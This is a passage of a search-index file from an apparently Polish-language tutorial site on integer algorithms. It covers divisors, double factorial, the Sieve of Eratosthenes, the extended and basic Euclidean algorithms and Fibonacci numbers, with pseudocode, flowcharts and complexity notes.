wcze\u015bniej pytanie: jakie liczby musimy sprawdzi\u0107? Po pierwsze mo\u017cemy \u0142atwo zauwa\u017cy\u0107, \u017ce nie ma sensu sprawdza\u0107 warto\u015bci mniejszych ni\u017c \\(1\\). Najmniejszy i zarazem pierwszy dzielnik to b\u0119dzie zawsze liczba \\(1\\). Od niej wi\u0119c zaczynamy poszukiwanie dzielnik\u00f3w. W kt\u00f3rym miejscu jednak nale\u017cy si\u0119 zatrzyma\u0107? C\u00f3\u017c, na pewno nie ma sensu sprawdza\u0107 warto\u015bci wi\u0119kszych od \\(n\\). Liczba nie mo\u017ce by\u0107 podzielna przez warto\u015b\u0107 od siebie wi\u0119ksz\u0105!</p> <p>Podsumowuj\u0105c wystarczy sprawdzi\u0107 wszystkie liczby od \\(1\\) do \\(n\\), aby znale\u017a\u0107 dzielniki. W ten spos\u00f3b otrzymali\u015bmy pierwsze, zgrubne ograniczenie naszego przeszukiwanego przedzia\u0142u warto\u015bci. Dla ka\u017cdej liczby z tego zakresu b\u0119dziemy sprawdza\u0107, czy jest ona dzielnikiem \\(n\\).</p> <p>Pozostaje jeszcze bardzo wa\u017cna kwestia: jak sprawdzi\u0107, czy jedna liczba jest dzielnikiem drugiej? C\u00f3\u017c, wystarczy sprawdzi\u0107, czy dziel\u0105 si\u0119 bez reszty. Czy te\u017c, bardziej formalnie, reszta z dzielenia wynosi \\(0\\).</p> <p>Spr\u00f3bujmy teraz to wszystko zapisa\u0107 w formie algorytmu.</p>"},{"location":"algorithms/integers/divisors/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja Dzielniki(n):\n    1. Od i := 1 do n, wykonuj:\n        2. Je\u017celi n mod i = 0, to:\n            3. Wypisz i\n</code></pre> <p>Info</p> <p>mod oznacza reszt\u0119 z dzielenia</p>"},{"location":"algorithms/integers/divisors/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"Dzielniki(n)\"]) --&gt; K0[i := 1]\n    K0 --&gt; K1{i &lt;= n}\n    K1 -- PRAWDA --&gt; K2{n mod i = 0}\n    K2 -- PRAWDA --&gt; K3[/Wypisz i/]\n    K3 --&gt; K1i[i := i + 1]\n    K2 -- FA\u0141SZ --&gt; K1i\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ ----&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/integers/divisors/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>W naszym rozwi\u0105zaniu przechodzimy przez wszystkie kolejne warto\u015bci od \\(1\\) do \\(n\\). Dla zadanego \\(n\\) mamy wi\u0119c do sprawdzenia \\(n\\) potencjalnych dzielnik\u00f3w. St\u0105d te\u017c otrzymujemy z\u0142o\u017cono\u015b\u0107:</p> <p>\\(O(n)\\) \u2014 liniowa</p>"},{"location":"algorithms/integers/divisors/#rozwiazanie-naiwne","title":"Rozwi\u0105zanie naiwne","text":"<p>Mamy ju\u017c pierwsze rozwi\u0105zanie naszego problemu. Zastan\u00f3wmy si\u0119 teraz, jak mo\u017cemy je zoptymalizowa\u0107, czyli usprawni\u0107. Szczeg\u00f3lnym fragmentem naszego rozwi\u0105zania, kt\u00f3ry a\u017c prosi si\u0119 o optymalizacj\u0119, jest przegl\u0105danie liczb od \\(1\\) do \\(n\\). Pomy\u015blmy, jak mo\u017cemy zaw\u0119zi\u0107 ten zakres?</p> <p>Zauwa\u017cmy, \u017ce od pewnej warto\u015bci mo\u017cemy mie\u0107 ju\u017c gwarancj\u0119, \u017ce nie znajdziemy kolejnych dzielnik\u00f3w, poza samym \\(n\\). Gdy sprawdzana liczba jest wi\u0119ksza od po\u0142owy \\(n\\), to nie mo\u017ce by\u0107 ju\u017c dzielnikiem \\(n\\). W zwi\u0105zku z tym wystarczy, \u017ce b\u0119dziemy sprawdza\u0107 potencjalne dzielniki do \\(n/2\\), a dok\u0142adniej do cz\u0119\u015bci ca\u0142kowitej z tego\u017c dzielenia. Musimy tylko pami\u0119ta\u0107 o tym, by wypisa\u0107 tak\u017ce warto\u015b\u0107 \\(n\\), je\u017celi jest wi\u0119ksze od jedynki.</p>"},{"location":"algorithms/integers/divisors/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja Dzielniki(n):\n    1. Od i := 1 do n div 2, wykonuj:\n        2. Je\u017celi n mod i = 0, to:\n            3. Wypisz i\n    4. Je\u017celi n &gt; 1, to:\n        5. Wypisz n\n</code></pre> <p>Info</p> <p>div oznacza dzielenie ca\u0142kowite</p>"},{"location":"algorithms/integers/divisors/#schemat-blokowy_1","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"Dzielniki(n)\"]) --&gt; K0[i := 1]\n    K0 --&gt; K1{i &lt;= n div 2}\n    K1 -- PRAWDA --&gt; K2{n mod i = 0}\n    K2 -- PRAWDA --&gt; K3[/Wypisz i/]\n    K3 --&gt; K1i[i := i + 1]\n    K2 -- FA\u0141SZ --&gt; K1i\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ --&gt; K4{n &gt; 1}\n    K4 -- PRAWDA --&gt; K5[/Wypisz n/]\n    K5 --&gt; STOP([STOP])\n    K4 -- FA\u0141SZ --&gt; STOP</code></pre>"},{"location":"algorithms/integers/divisors/#zozonosc_1","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>W naszym rozwi\u0105zaniu przechodzimy przez wszystkie kolejne warto\u015bci od \\(1\\) do \\(n/2\\). Dla zadanego \\(n\\) mamy wi\u0119c do sprawdzenia \\(n/2\\) potencjalnych dzielnik\u00f3w. St\u0105d te\u017c otrzymujemy z\u0142o\u017cono\u015b\u0107:</p> <p>\\(O(\\frac{n}{2})\\)</p>"},{"location":"algorithms/integers/divisors/#rozwiazanie-optymalne","title":"Rozwi\u0105zanie optymalne","text":"<p>Mo\u017cemy jeszcze bardziej skr\u00f3ci\u0107 zakres przeszukiwania potencjalnych dzielnik\u00f3w. Podobnie jak przy te\u015bcie pierwszo\u015bci, wystarczy \u017ce sprawdzimy dzielniki do pierwiastka z zadanej liczby. W ten spos\u00f3b jednak nie znajdziemy wszystkich dzielnik\u00f3w, a co najwy\u017cej ich po\u0142ow\u0119. Dlatego dla ka\u017cdego znalezionego w ten spos\u00f3b dzielnika musimy wypisa\u0107 jeszcze ten drugi z pary.</p>"},{"location":"algorithms/integers/divisors/#pseudokod_2","title":"Pseudokod","text":"<pre><code>funkcja Dzielniki(n):\n    1. Od i := 1 do sqrt(n), wykonuj:\n        2. Je\u017celi n mod i = 0, to:\n            3. Wypisz i\n            4. Je\u017celi (n / i) != i, to:\n                5. Wypisz (n / i)\n</code></pre> <p>Info</p> <p>sqrt oznacza pierwiastek</p>"},{"location":"algorithms/integers/divisors/#schemat-blokowy_2","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"Dzielniki(n)\"]) --&gt; K0[i := 1]\n    K0 --&gt; K1{\"i &lt;= sqrt(n)\"}\n    K1 -- PRAWDA --&gt; K2{n mod i = 0}\n    K2 -- PRAWDA --&gt; K3[/Wypisz i/]\n    K3 --&gt; K4{\"(n / i) != i\"}\n    K4 -- PRAWDA --&gt; K5[/\"Wypisz (n / i)\"/]\n    K5 --&gt; K1i[i := i + 1]\n    K4 -- FA\u0141SZ --&gt; K1i\n    K2 -- FA\u0141SZ --&gt; K1i\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ ------&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/integers/divisors/#zozonosc_2","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>W naszym rozwi\u0105zaniu przechodzimy przez wszystkie kolejne warto\u015bci od \\(1\\) do \\(\\sqrt{n}\\). Dla zadanego \\(n\\) mamy wi\u0119c do sprawdzenia \\(\\sqrt{n}\\) potencjalnych dzielnik\u00f3w. St\u0105d te\u017c otrzymujemy z\u0142o\u017cono\u015b\u0107:</p> <p>\\(O(\\sqrt{n})\\)</p>"},{"location":"algorithms/integers/divisors/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/integers/divisors/#c","title":"C++","text":""},{"location":"algorithms/integers/divisors/#python","title":"Python","text":""},{"location":"algorithms/integers/divisors/#implementacja-pozostae","title":"Implementacja - pozosta\u0142e","text":""},{"location":"algorithms/integers/divisors/#haskell","title":"Haskell","text":""},{"location":"algorithms/integers/double-factorial/","title":"Podw\u00f3jna silnia","text":"<p>Podw\u00f3jna silnia (ang. double factorial) to operacja na liczbach naturalnych, kt\u00f3ra jest rozszerzeniem standardowego poj\u0119cia silni.</p>"},{"location":"algorithms/integers/double-factorial/#definicja","title":"Definicja","text":"<p>Dla liczby naturalnej \\(n\\), podw\u00f3jna silnia \\(n!!\\) jest iloczynem wszystkich liczb z zakresu od \\(1\\) do \\(n\\) w\u0142\u0105cznie, kt\u00f3re maj\u0105 t\u0119 sam\u0105 parzysto\u015b\u0107 co \\(n\\). Czyli, dla liczby parzystej \\(n\\), \\(n!!\\) to iloczyn wszystkich liczb parzystych od \\(2\\) do \\(n\\), a dla liczby nieparzystej \\(n\\), \\(n!!\\) to iloczyn wszystkich liczb nieparzystych od \\(1\\) do \\(n\\).</p> <p>Zatem:</p> <ul> <li>dla \\(n = 0\\) lub \\(n = 1\\), \\(n!! = 1\\)</li> <li>dla \\(n\\) parzystego, \\(n!! = 2 * 4 * 6 * ... * n\\)</li> <li>dla \\(n\\) nieparzystego, \\(n!! = 1 * 3 * 5 * ... * n\\)</li> </ul> <p>Na przyk\u0142ad:</p> <ul> <li>\\(8!! = 2 * 4 * 6 * 8 = 384\\)</li> <li>\\(7!! = 1 * 3 * 5 * 7 = 105\\)</li> </ul>"},{"location":"algorithms/integers/double-factorial/#zastosowanie","title":"Zastosowanie","text":"<p>Podw\u00f3jna silnia pojawia si\u0119 w wielu wzorach w matematyce i fizyce, w szczeg\u00f3lno\u015bci w statystyce, teorii szereg\u00f3w, analizie kombinatorycznej i teorii graf\u00f3w.</p> <p>Warto zauwa\u017cy\u0107, \u017ce podw\u00f3jna silnia ro\u015bnie bardzo szybko, podobnie jak standardowa silnia.</p>"},{"location":"algorithms/integers/double-factorial/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/integers/double-factorial/#python","title":"Python","text":""},{"location":"algorithms/integers/eratosthenes-sieve/","title":"Sito Eratostenesa","text":"<p>Liczby pierwsze odgrywaj\u0105 wa\u017cn\u0105 rol\u0119 nie tylko w matematyce, ale tak\u017ce w informatyce, szczeg\u00f3lnie w kryptografii. Potrzebne s\u0105 wi\u0119c metody efektywnego obliczania liczb pierwszych, a najlepiej ca\u0142ego ich zbioru. Jedn\u0105 z takich metod jest w\u0142a\u015bnie Sito Eratostenesa, kt\u00f3re pozwala nam na wydajne obliczenie wszystkich liczb pierwszych mniejszych b\u0105d\u017a r\u00f3wnych zadanej warto\u015bci. Zapoznaj si\u0119 z poni\u017csz\u0105 prezentacj\u0105 by zrozumie\u0107 dzia\u0142anie tego algorytmu.</p> <p> Sito Eratostenesa \u2014 prezentacja</p>"},{"location":"algorithms/integers/eratosthenes-sieve/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/integers/eratosthenes-sieve/#dane","title":"Dane","text":"<ul> <li>\\(n\\) \u2014 liczba ca\u0142kowita</li> </ul>"},{"location":"algorithms/integers/eratosthenes-sieve/#wynik","title":"Wynik","text":"<ul> <li>Wszystkie liczby pierwsze od \\(1\\) do \\(n\\) w\u0142\u0105cznie.</li> </ul>"},{"location":"algorithms/integers/eratosthenes-sieve/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithms/integers/eratosthenes-sieve/#dane_1","title":"Dane","text":"<pre><code>n := 10\n</code></pre>"},{"location":"algorithms/integers/eratosthenes-sieve/#wynik_1","title":"Wynik","text":"<p>\\(2, 3, 5, 7\\) </p>"},{"location":"algorithms/integers/eratosthenes-sieve/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Na pocz\u0105tku potrzebujemy stworzy\u0107 tablic\u0119, w kt\u00f3rej b\u0119dziemy zapami\u0119tywa\u0107, czy dana liczba jest pierwsza, czy te\u017c nie. W takim razie tworzymy \\(n\\)-elementow\u0105 tablic\u0119 warto\u015bci prawda/fa\u0142sz. Pocz\u0105tkowo wype\u0142niamy ca\u0142\u0105 tablic\u0119 warto\u015bciami prawda. Wiemy, \u017ce liczba \\(1\\) nie jest liczb\u0105 pierwsz\u0105, wi\u0119c odznaczamy j\u0105 w tablicy warto\u015bci\u0105 fa\u0142sz. Nast\u0119pnie przechodzimy p\u0119tl\u0105 od liczby \\(2\\) do \\(n\\). Dla ka\u017cdej warto\u015bci b\u0119dziemy sprawdza\u0107, czy ma ona w tablicy przypisan\u0105 warto\u015b\u0107 prawda, tzn. czy jest liczb\u0105 pierwsz\u0105. Je\u017celi tak jest, to przechodzimy przez wszystkie kolejne wielokrotno\u015bci tej liczby (a\u017c do \\(n\\)) i odznaczamy je w tablicy jako fa\u0142sz.</p> <p>Gdy ju\u017c przejdziemy przez wszystkie warto\u015bci z zadanego zakresu, nasza tablica jest gotowa. Mo\u017cemy ponownie przej\u015b\u0107 p\u0119tl\u0105 od \\(2\\) do \\(n\\) i zebra\u0107 wszystkie liczby, kt\u00f3re w tablicy maj\u0105 przypisan\u0105 warto\u015b\u0107 prawda, czyli wszystkie liczby pierwsze.</p>"},{"location":"algorithms/integers/eratosthenes-sieve/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja SitoEratostenesa(n):\n    1. A[1..n] := tablica wype\u0142niona warto\u015bciami true\n    2. A[1] := false\n    3. Od i := 2 do n wykonuj:\n        4. Je\u017celi A[i] = true, to:\n            5. j := i * 2\n            6. Dop\u00f3ki j &lt;= n, wykonuj:\n                7. A[j] := false\n                8. j := j + i\n    10. pierwsze := pusta tablica\n    11. Od i := 2 do n, wykonuj:\n        11. Je\u017celi A[i] = true, to:\n            12. Dopisz i do tablicy pierwsze\n    13. Zwr\u00f3\u0107 pierwsze\n</code></pre>"},{"location":"algorithms/integers/eratosthenes-sieve/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n\\log{n})\\) \u2014 liniowo logarytmiczna</p>"},{"location":"algorithms/integers/eratosthenes-sieve/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/integers/eratosthenes-sieve/#c","title":"C++","text":""},{"location":"algorithms/integers/eratosthenes-sieve/#python","title":"Python","text":""},{"location":"algorithms/integers/extended-euclidean/","title":"Rozszerzony algorytm Euklidesa","text":"<p>Rozszerzony algorytm Euklidesa jest modyfikacj\u0105 klasycznego algorytmu Euklidesa, kt\u00f3ry s\u0142u\u017cy do obliczania najwi\u0119kszego wsp\u00f3lnego dzielnika (NWD) dw\u00f3ch liczb ca\u0142kowitych. Problemem, kt\u00f3ry rozwi\u0105zuje rozszerzony algorytm Euklidesa, jest znalezienie rozwi\u0105za\u0144 r\u00f3wnania Diofantycznego postaci \\(ax + by = NWD(a,b)\\), gdzie \\(a\\) i \\(b\\) s\u0105 liczbami ca\u0142kowitymi, a \\(x\\) i \\(y\\) s\u0105 niewiadomymi. Jest to przydatne w wielu dziedzinach, takich jak kryptografia, teoria liczb, matematyka dyskretna czy programowanie liniowe.</p>"},{"location":"algorithms/integers/extended-euclidean/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/integers/extended-euclidean/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) \u2014 liczby naturalne, wi\u0119ksze od zera</li> </ul>"},{"location":"algorithms/integers/extended-euclidean/#wynik","title":"Wynik","text":"<ul> <li>\\(x, y\\) - liczby ca\u0142kowite, takie \u017ce \\(ax + by = NWD(a,b)\\)</li> <li>\\(NWD(a, b)\\) \u2014 najwi\u0119kszy wsp\u00f3lny dzielnik liczb \\(a\\) i \\(b\\) </li> </ul>"},{"location":"algorithms/integers/extended-euclidean/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithms/integers/extended-euclidean/#dane_1","title":"Dane","text":"<pre><code>a := 6\nb := 21\n</code></pre>"},{"location":"algorithms/integers/extended-euclidean/#wynik_1","title":"Wynik","text":"<pre><code>x := -3\ny := 1\nNWD(a, b) := 3\n</code></pre> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\(6 * (-3) + 21 * 1 = 3\\)</p>"},{"location":"algorithms/integers/extended-euclidean/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/integers/extended-euclidean/#c","title":"C++","text":""},{"location":"algorithms/integers/extended-euclidean/#python","title":"Python","text":""},{"location":"algorithms/integers/fibonacci-numbers/","title":"Liczby Fibonacciego","text":"<p>Ci\u0105g Fibonacciego to ci\u0105g, w kt\u00f3rym dwa pierwsze elementy maj\u0105 warto\u015b\u0107 \\(1\\), a ka\u017cdy kolejny element stanowi sum\u0119 dw\u00f3ch poprzednich.</p> <p>Pierwszych dziesi\u0119\u0107 kolejnych liczb Fibonacciego to: \\(1, 1, 2, 3, 5, 8, 13, 21, 34, 55\\).</p>"},{"location":"algorithms/integers/fibonacci-numbers/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/integers/fibonacci-numbers/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, \\(n&gt;0\\).</li> </ul>"},{"location":"algorithms/integers/fibonacci-numbers/#wynik","title":"Wynik","text":"<ul> <li>\\(n\\)-ta liczba Fibonacciego.</li> </ul>"},{"location":"algorithms/integers/fibonacci-numbers/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithms/integers/fibonacci-numbers/#dane_1","title":"Dane","text":"<pre><code>n := 10\n</code></pre> <p>Wynik: \\(55\\) </p>"},{"location":"algorithms/integers/fibonacci-numbers/#rozwiazanie-rekurencyjne","title":"Rozwi\u0105zanie rekurencyjne","text":"\\[ Fib(n) =  \\begin{cases}        1 &amp; n \\leq 2 \\\\       Fib(n - 1) + Fib(n - 2) &amp; n &gt; 2 \\\\    \\end{cases} \\]"},{"location":"algorithms/integers/fibonacci-numbers/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja Fib(n):\n    1. Je\u017celi n &lt;= 2, to:\n        2. Zwr\u00f3\u0107 1\n    3. Zwr\u00f3\u0107 Fib(n - 1) + Fib(n - 2)\n</code></pre>"},{"location":"algorithms/integers/fibonacci-numbers/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"Fib(n)\"]) --&gt; K1{n &lt;= 2}\n    K1 -- PRAWDA --&gt; K2[/Zwr\u00f3\u0107 1/]\n    K2 --&gt; STOP([STOP])\n    K1 -- FA\u0141SZ --&gt; K3[/\"Zwr\u00f3\u0107 Fib(n - 1) + Fib(n - 2)\"/]\n    K3 --&gt; STOP</code></pre>"},{"location":"algorithms/integers/fibonacci-numbers/#rozwiazanie-iteracyjne","title":"Rozwi\u0105zanie iteracyjne","text":""},{"location":"algorithms/integers/fibonacci-numbers/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja Fib(n):\n    1. f1 := 1\n    2. f2 := 1\n    3. Od i := 3 do n + 1, wykonuj:\n        4. f3 := f1 + f2\n        5. f1 := f2\n        6. f2 := f3\n    7. Zwr\u00f3\u0107 f2\n</code></pre>"},{"location":"algorithms/integers/fibonacci-numbers/#schemat-blokowy_1","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"Fib(n)\"]) --&gt; K1[\"f1 := 1\n    f2 := 1\n    i := 3\"]\n    K1 --&gt; K3{i &lt;= n + 1}\n    K3 -- PRAWDA --&gt; K4[\"f3 := f1 + f2\n    f1 := f2\n    f2 := f3\n    i := i +1\"]\n    K4 --&gt; K3\n    K3 -- FA\u0141SZ --&gt; K7[/Zwr\u00f3\u0107 f2/]\n    K7 --&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/integers/fibonacci-numbers/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/integers/fibonacci-numbers/#c","title":"C++","text":""},{"location":"algorithms/integers/fibonacci-numbers/#python","title":"Python","text":""},{"location":"algorithms/integers/fibonacci-numbers/#implementacja-pozostae","title":"Implementacja - pozosta\u0142e","text":""},{"location":"algorithms/integers/fibonacci-numbers/#haskell","title":"Haskell","text":""},{"location":"algorithms/integers/gcd/","title":"Algorytm Euklidesa","text":"<p>Algorytm Euklidesa to jeden z najstarszych znanych algorytm\u00f3w, kt\u00f3ry zosta\u0142 opisany przez staro\u017cytnego greckiego matematyka Euklidesa w jego dziele \"Elementy\" oko\u0142o 300 roku p.n.e. Algorytm ten s\u0142u\u017cy do znajdowania najwi\u0119kszego wsp\u00f3lnego dzielnika (NWD) dw\u00f3ch liczb naturalnych. Jest on oparty na prostej obserwacji, \u017ce NWD dw\u00f3ch liczb nie zmienia si\u0119, je\u015bli wi\u0119ksz\u0105 z tych liczb zast\u0105pimy r\u00f3\u017cnic\u0105 tych liczb. Dzi\u0119ki temu mo\u017cemy iteracyjnie zmniejsza\u0107 warto\u015bci liczb, a\u017c do momentu, gdy stan\u0105 si\u0119 one r\u00f3wne, co oznacza, \u017ce znale\u017ali\u015bmy NWD.</p> <p>Algorytm Euklidesa znajduje zastosowanie w wielu dziedzinach matematyki i informatyki, m.in. w kryptografii (np. w algorytmie RSA), w teorii liczb, a tak\u017ce w problemach zwi\u0105zanych z obliczeniami na wielkich liczbach. Jego prostota i efektywno\u015b\u0107 sprawiaj\u0105, \u017ce jest to jedno z podstawowych narz\u0119dzi w arsenale ka\u017cdego matematyka i programisty.</p>"},{"location":"algorithms/integers/gcd/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/integers/gcd/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) \u2014 liczby naturalne, wi\u0119ksze od zera, tzn. \\(a,b\\in\\mathbb{N}\\), \\(a&gt;0,b&gt;0\\)</li> </ul>"},{"location":"algorithms/integers/gcd/#wynik","title":"Wynik","text":"<ul> <li>\\(\\mathrm{NWD}(a, b)\\) \u2014 najwi\u0119kszy wsp\u00f3lny dzielnik liczb \\(a\\) i \\(b\\) </li> </ul>"},{"location":"algorithms/integers/gcd/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithms/integers/gcd/#dane_1","title":"Dane","text":"<pre><code>a := 32\nb := 12\n</code></pre>"},{"location":"algorithms/integers/gcd/#wynik_1","title":"Wynik","text":"<p>\\(\\mathrm{NWD}(32, 12) = 4\\) </p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>Dzielnikami liczby \\(32\\) s\u0105: \\(1, 2, 4, 8, 16, 32\\)</p> <p>Dzielnikami liczby \\(12\\) s\u0105: 1, 2, 3, 4, 6, 12</p> <p>Wsp\u00f3lnymi dzielnikami s\u0105 wi\u0119c: \\(1, 2, 4\\) </p> <p>Najwi\u0119kszy z nich to w\u0142a\u015bnie \\(4\\).</p>"},{"location":"algorithms/integers/gcd/#wersja-z-odejmowaniem","title":"Wersja z odejmowaniem","text":"<p>Zasada jest prosta: od wi\u0119kszej liczby odejmujemy mniejsz\u0105 i tak w k\u00f3\u0142ko, a\u017c uzyskamy dwie takie same warto\u015bci, kt\u00f3re b\u0119d\u0105 naszym wynikiem. Proces ten mo\u017cna opisa\u0107 nast\u0119puj\u0105co:</p> <ol> <li>Por\u00f3wnujemy dwie liczby, \\(a\\) i \\(b\\).</li> <li>Je\u015bli \\(a\\) jest wi\u0119ksze od \\(b\\), odejmujemy \\(b\\) od \\(a\\).</li> <li>Je\u015bli \\(b\\) jest wi\u0119ksze od \\(a\\), odejmujemy \\(a\\) od \\(b\\).</li> <li>Powtarzamy kroki 1-3, a\u017c obie liczby b\u0119d\u0105 r\u00f3wne.</li> <li>Gdy obie liczby s\u0105 r\u00f3wne, osi\u0105gn\u0119li\u015bmy najwi\u0119kszy wsp\u00f3lny dzielnik (NWD).</li> </ol>"},{"location":"algorithms/integers/gcd/#przykad-1","title":"Przyk\u0142ad 1","text":"a b 28 12 28-12=16 12 16-12=4 12 4 12-4=8 4 8-4=4 <p>\\(\\mathrm{NWD}(28, 12)=4\\)</p>"},{"location":"algorithms/integers/gcd/#przykad-2","title":"Przyk\u0142ad 2","text":"a b 3 16 3 13 3 10 3 7 3 4 3 1 2 1 1 1 <p>\\(\\mathrm{NWD}(3, 16) = 1\\)</p>"},{"location":"algorithms/integers/gcd/#przykad-3","title":"Przyk\u0142ad 3","text":"a b 6 18 6 12 6 6 <p>\\(\\mathrm{NWD}(6,18)=6\\)</p>"},{"location":"algorithms/integers/gcd/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja NWD(a, b):\n    1. Dop\u00f3ki a != b, wykonuj:\n        2. Je\u017celi a &gt; b, to:\n            3. a := a - b\n        4. W przeciwnym przypadku:\n            5. b := b - a\n    6. Zwr\u00f3\u0107 a\n</code></pre>"},{"location":"algorithms/integers/gcd/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"NWD(a, b)\"]) --&gt; K1{a != b}\n    K1 -- PRAWDA --&gt; K2{a &gt; b}\n    K2 -- PRAWDA --&gt; K3[a := a - b]\n    K3 --&gt; K1\n    K2 -- FA\u0141SZ --&gt; K5[b := b - a]\n    K5 --&gt; K1\n    K1 -- FA\u0141SZ --&gt; K6[/Zwr\u00f3\u0107 a/]\n    K6 --&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/integers/gcd/#wersja-z-modulo-iteracyjna","title":"Wersja z modulo \u2014 iteracyjna","text":"<p>Odejmowanie mo\u017cemy zast\u0105pi\u0107 operacj\u0105 reszty z dzielenia, kt\u00f3ra jest du\u017co wydajniejsza w tym przypadku.</p>"},{"location":"algorithms/integers/gcd/#przykad-1_1","title":"Przyk\u0142ad 1","text":"a b 28 12 12 (b z wiersza wy\u017cej) 28 mod 12 (a % b) = 4 4 (b z wiersza wy\u017cej) 12 mod 4 (a % b) = 0 <p>\\(\\mathrm{NWD}(28, 12)=4\\)</p>"},{"location":"algorithms/integers/gcd/#przykad-2_1","title":"Przyk\u0142ad 2","text":"a b 3 16 16 3 mod 16 = 3 3 16 mod 3 = 1 1 3 mod 1 = 0 <p>\\(\\mathrm{NWD}(3, 16) = 1\\)</p>"},{"location":"algorithms/integers/gcd/#przykad-3_1","title":"Przyk\u0142ad 3","text":"a b 6 18 18 6 6 0 <p>\\(\\mathrm{NWD}(6,18)=6\\)</p>"},{"location":"algorithms/integers/gcd/#przykad-4","title":"Przyk\u0142ad 4","text":"a b 100 2 2 0 <p>\\(\\mathrm{NWD}(100, 2) = 2\\)</p>"},{"location":"algorithms/integers/gcd/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja NWD(a, b):\n    1. Dop\u00f3ki b != 0, wykonuj:\n        2. b2 := b\n        3. b := a mod b\n        4. a := b2\n    5. Zwr\u00f3c a\n</code></pre> <p>Info</p> <p>mod oznacza reszt\u0119 z dzielenia</p>"},{"location":"algorithms/integers/gcd/#schemat-blokowy_1","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"NWD(a, b)\"]) --&gt; K1{b != 0}\n    K1 -- PRAWDA --&gt; K2[\"b2 := b\n    b := a mod b\n    a := b2\"]\n    K2 --&gt; K1\n    K1 -- FA\u0141SZ --&gt; K5[/Zwr\u00f3\u0107 a/]\n    K5 --&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/integers/gcd/#wersja-z-modulo-rekurencyjna","title":"Wersja z modulo \u2014 rekurencyjna","text":"<p>Opisan\u0105 wy\u017cej metod\u0119 mo\u017cemy r\u00f3wnie\u017c zdefiniowa\u0107 rekurencyjnie.</p> \\[ \\mathrm{NWD}(a, b) = \\begin{cases}  a &amp; b=0 \\\\ \\mathrm{NWD}(b, a \\mod b) &amp; b\\not =0 \\\\     \\end{cases} \\]"},{"location":"algorithms/integers/gcd/#pseudokod_2","title":"Pseudokod","text":"<pre><code>funkcja NWD(a, b):\n    1. Je\u017celi b = 0, to:\n        2. Zwr\u00f3\u0107 a i zako\u0144cz\n    3. Zwr\u00f3\u0107 NWD(b, a mod b) i zako\u0144cz\n</code></pre>"},{"location":"algorithms/integers/gcd/#schemat-blokowy_2","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"NWD(a, b)\"]) --&gt; K1{b = 0}\n    K1 -- PRAWDA --&gt; K2[/Zwr\u00f3\u0107 a/]\n    K2 --&gt; STOP([STOP])\n    K1 -- FA\u0141SZ --&gt; K3[/\"Zwr\u00f3\u0107 NWD(b, a mod b)\"/]\n    K3 --&gt; STOP</code></pre>"},{"location":"algorithms/integers/gcd/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/integers/gcd/#c","title":"C++","text":""},{"location":"algorithms/integers/gcd/#python","title":"Python","text":""},{"location":"algorithms/integers/gcd/#blockly","title":"Blockly","text":""},{"location":"algorithms/integers/gcd/#implementacja-pozostae","title":"Implementacja - pozosta\u0142e","text":""},{"location":"algorithms/integers/gcd/#haskell","title":"Haskell","text":""},{"location":"algorithms/integers/perfect-test/","title":"Test doskona\u0142o\u015bci","text":"<p>Czym jest liczba doskona\u0142a? Zacznijmy od dw\u00f3ch definicji.</p> <p>Info</p> 